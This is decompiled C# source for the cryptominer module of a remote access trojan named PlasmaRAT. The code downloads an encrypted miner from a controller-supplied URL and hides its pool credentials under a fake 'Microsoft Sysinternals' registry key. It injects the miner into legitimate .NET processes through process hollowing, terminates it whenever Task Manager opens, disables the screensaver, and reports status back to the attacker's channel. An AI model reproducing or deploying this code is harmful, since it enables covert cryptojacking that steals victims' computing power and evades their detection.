using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System_Configuration.My;

namespace System_Configuration
{
	// Token: 0x02000017 RID: 23
	[StandardModule]
	internal sealed class Miner
	{
		// Token: 0x0600008D RID: 141
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int SystemParametersInfoA(int uAction, int uParam, ref int lpvParam, int uWinIni);

		// Token: 0x0600008E RID: 142 RVA: 0x00009018 File Offset: 0x00007218
		public static void MinerThreader()
		{
			if (Miner.RanMiner)
			{
				try
				{
					if (Process.GetProcessesByName("taskmgr").Length >= 1)
					{
						try
						{
							foreach (object obj in ((IEnumerable)NewLateBinding.LateGet(Interaction.GetObject("winmgmts:", null), null, "ExecQuery", new object[]
							{
								"Select Name from Win32_Process Where Name = '" + Miner.MinerExecutable + ".exe'"
							}, null, null, null)))
							{
								object objectValue = RuntimeHelpers.GetObjectValue(obj);
								NewLateBinding.LateCall(objectValue, null, "Terminate", new object[0], null, null, null, true);
							}
							return;
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
					if (Process.GetProcessesByName(Miner.MinerExecutable).Length < 1)
					{
						Miner.RanMiner = false;
						Miner.BeginMiner();
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x0600008F RID: 143 RVA: 0x0000910C File Offset: 0x0000730C
		public static void BeginMiner()
		{
			try
			{
				if (!Miner.RanMiner)
				{
					string setting = Interaction.GetSetting("Microsoft", "Sysinternals", "id", "");
					if (Operators.CompareString(setting, string.Empty, false) != 0)
					{
						string[] array = Strings.Split(setting, "*", -1, CompareMethod.Binary);
						if (File.Exists(Conversions.ToString(Miner.PoolerMiner)))
						{
							Persistence.AllowAccess(Conversions.ToString(Miner.PoolerMiner));
							int num = Environment.ProcessorCount;
							if (num == 0)
							{
								num = 1;
							}
							if (num == 2)
							{
								num = 1;
							}
							if (num == 3)
							{
								num = 2;
							}
							if (num == 4)
							{
								num = 3;
							}
							if (num == 6)
							{
								num = 4;
							}
							if (num == 8)
							{
								num = 6;
							}
							if (num == 12)
							{
								num = 10;
							}
							if (num == 16)
							{
								num = 14;
							}
							byte[] input = MyProject.Computer.FileSystem.ReadAllBytes(Conversions.ToString(Miner.PoolerMiner));
							byte[] array2 = Miner.Proper_RC4(input, Encoding.UTF8.GetBytes(PlasmaRAT.Username));
							Array.Reverse(array2, 0, array2.Length);
							string optionalArguments = string.Concat(new string[]
							{
								"-a scrypt -o ",
								array[1],
								" -O ",
								array[2],
								":",
								array[3],
								" -t",
								num.ToString()
							});
							if (mRunpe.InjectPE(array2, RuntimeEnvironment.GetRuntimeDirectory() + "cvtres.exe", optionalArguments))
							{
								Miner.RanMiner = true;
								Miner.MinerExecutable = "cvtres";
							}
							else if (mRunpe.InjectPE(array2, RuntimeEnvironment.GetRuntimeDirectory() + "vbc.exe", optionalArguments))
							{
								Miner.RanMiner = true;
								Miner.MinerExecutable = "vbc";
							}
							else if (mRunpe.InjectPE(array2, RuntimeEnvironment.GetRuntimeDirectory() + "csc.exe", optionalArguments))
							{
								Miner.RanMiner = true;
								Miner.MinerExecutable = "csc";
							}
							else if (mRunpe.InjectPE(array2, RuntimeEnvironment.GetRuntimeDirectory() + "ngen.exe", optionalArguments))
							{
								Miner.RanMiner = true;
								Miner.MinerExecutable = "ngen";
							}
							Miner.SetScreenSaverActive(false);
							if (Miner.RanMiner)
							{
								PlasmaRAT.TalktoChannel(string.Concat(new string[]
								{
									"Miner: Injected into ",
									Miner.MinerExecutable,
									".exe. Started Mining With ",
									num.ToString(),
									" Cores."
								}), string.Empty);
							}
							else
							{
								PlasmaRAT.TalktoChannel("Miner: Failed to Inject.", string.Empty);
							}
						}
					}
				}
				else
				{
					PlasmaRAT.TalktoChannel("Miner: Already Running on System", string.Empty);
				}
			}
			catch (Exception ex)
			{
				PlasmaRAT.TalktoChannel("Miner: Failed to Inject File.", string.Empty);
			}
		}

		// Token: 0x06000090 RID: 144 RVA: 0x000093F0 File Offset: 0x000075F0
		public static void InstallMiner(string FileDownload, string Pool, string Username, string Password)
		{
			try
			{
				if (!File.Exists(Conversions.ToString(Miner.PoolerMiner)))
				{
					WebClient webClient = new WebClient();
					byte[] input = webClient.DownloadData(FileDownload);
					byte[] bytes = Miner.Proper_RC4(input, Encoding.UTF8.GetBytes(PlasmaRAT.Username));
					File.WriteAllBytes(Conversions.ToString(Miner.PoolerMiner), bytes);
				}
				Interaction.SaveSetting("Microsoft", "Sysinternals", "id", string.Concat(new string[]
				{
					"*",
					Pool,
					"*",
					Username,
					"*",
					Password,
					"*"
				}));
				Miner.BeginMiner();
			}
			catch (Exception ex)
			{
				PlasmaRAT.TalktoChannel("Miner: Failed to Download Files. Error: " + ex.ToString(), string.Empty);
			}
		}

		// Token: 0x06000091 RID: 145 RVA: 0x000094EC File Offset: 0x000076EC
		public static void RemoveMiner()
		{
			int num;
			int num4;
			object obj2;
			try
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				IL_07:
				int num2 = 2;
				string setting = Interaction.GetSetting("Microsoft", "Sysinternals", "id", "");
				IL_23:
				num2 = 3;
				if (Operators.CompareString(setting, string.Empty, false) == 0)
				{
					goto IL_FC;
				}
				IL_37:
				num2 = 4;
				Interaction.SaveSetting("Microsoft", "Sysinternals", "id", string.Empty);
				IL_52:
				num2 = 5;
				IEnumerator enumerator = ((IEnumerable)NewLateBinding.LateGet(Interaction.GetObject("winmgmts:", null), null, "ExecQuery", new object[]
				{
					"Select Name from Win32_Process Where Name = '" + Miner.MinerExecutable + ".exe'"
				}, null, null, null)).GetEnumerator();
				while (enumerator.MoveNext())
				{
					object obj = enumerator.Current;
					object objectValue = RuntimeHelpers.GetObjectValue(obj);
					IL_A8:
					num2 = 6;
					NewLateBinding.LateCall(objectValue, null, "Terminate", new object[0], null, null, null, true);
					IL_C2:
					num2 = 7;
				}
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
				IL_E2:
				num2 = 8;
				Miner.RanMiner = false;
				IL_EA:
				num2 = 9;
				PlasmaRAT.TalktoChannel("CPU Miner: Stopped Successfully.", string.Empty);
				IL_FC:
				goto IL_17B;
				IL_FE:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_13A:
				goto IL_170;
				IL_13C:
				num4 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_14D:;
			}
			catch when (endfilter(obj2 is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj3;
				goto IL_13C;
			}
			IL_170:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_17B:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000092 RID: 146 RVA: 0x0000969C File Offset: 0x0000789C
		public static bool SetScreenSaverActive(bool Active)
		{
			bool result;
			try
			{
				int uAction = 17;
				int uParam = (-((Active > false) ? 1 : 0)) ? 1 : 0;
				int num = 0;
				int num2 = Miner.SystemParametersInfoA(uAction, uParam, ref num, 0);
				result = (num2 > 0);
			}
			catch (Exception ex)
			{
			}
			return result;
		}

		// Token: 0x06000093 RID: 147 RVA: 0x000096E0 File Offset: 0x000078E0
		public static byte[] Proper_RC4(byte[] Input, byte[] Key)
		{
			byte[] result;
			try
			{
				uint[] array = new uint[256];
				byte[] array2 = new byte[Input.Length - 1 + 1];
				uint num = 0u;
				do
				{
					array[(int)num] = num;
					num += 1u;
				}
				while (num <= 255u);
				num = 0u;
				uint num2;
				do
				{
					num2 = (uint)((ulong)(num2 + (uint)Key[(int)((ulong)num % (ulong)((long)Key.Length))] + array[(int)num]) & 255UL);
					uint num3 = array[(int)num];
					array[(int)num] = array[(int)num2];
					array[(int)num2] = num3;
					num += 1u;
				}
				while (num <= 255u);
				num = 0u;
				num2 = 0u;
				int num4 = 0;
				int num5 = array2.Length - 1;
				for (int i = num4; i <= num5; i++)
				{
					num = (uint)((ulong)num + 1UL & 255UL);
					num2 = (uint)((ulong)(num2 + array[(int)num]) & 255UL);
					uint num3 = array[(int)num];
					array[(int)num] = array[(int)num2];
					array[(int)num2] = num3;
					array2[i] = (byte)((uint)Input[i] ^ array[(int)((ulong)(array[(int)num] + array[(int)num2]) & 255UL)]);
				}
				result = array2;
			}
			catch (Exception ex)
			{
			}
			return result;
		}

		// Token: 0x04000075 RID: 117
		private const int SPI_SETSCREENSAVERACTIVE = 17;

		// Token: 0x04000076 RID: 118
		private static bool RanMiner = false;

		// Token: 0x04000077 RID: 119
		public static object PoolerMiner = PlasmaRAT.InstallationOfEverything + "324234.TMP";

		// Token: 0x04000078 RID: 120
		public static string MinerExecutable = "eAtShiTAnDDiE.exe";
	}
}
